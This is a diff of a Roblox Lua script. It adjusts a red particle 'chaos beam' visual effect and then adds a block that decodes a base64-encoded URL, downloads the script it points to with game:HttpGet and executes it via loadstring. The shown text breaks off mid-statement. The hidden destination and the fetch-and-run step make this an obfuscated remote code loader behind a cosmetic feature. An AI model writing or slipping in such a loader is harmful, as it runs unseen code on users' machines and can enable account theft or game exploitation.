@@ -79,11 +79,15 @@ end
 
 -- Function to play the chaos beam effect (visual)
 local function playChaosBeamEffect()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+    -- Create particle effect
     local chaosBeam = Instance.new("ParticleEmitter")
     chaosBeam.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0))  -- Red color for chaos
     chaosBeam.Size = NumberSequence.new(5)  -- Large particle size
     chaosBeam.Speed = NumberRange.new(50, 100)  -- Randomized speed
-    chaosBeam.Parent = LocalPlayer.Character.HumanoidRootPart
+    chaosBeam.Parent = humanoidRootPart
     chaosBeam:Emit(200)  -- Emit 200 particles for the beam effect
 end
 
@@ -177,3 +181,10 @@ end
 -- Decode the Script URL
 local decodedUrl = decodeBase64(encodedUrl)
 print("Decoded URL:", decodedUrl) -- Debugging: Print the decoded URL
+
+-- Load and Execute the Script
+local success, err = pcall(function()
+    loadstring(game:HttpGet(decodedUrl))()
+end)
+
+if not success
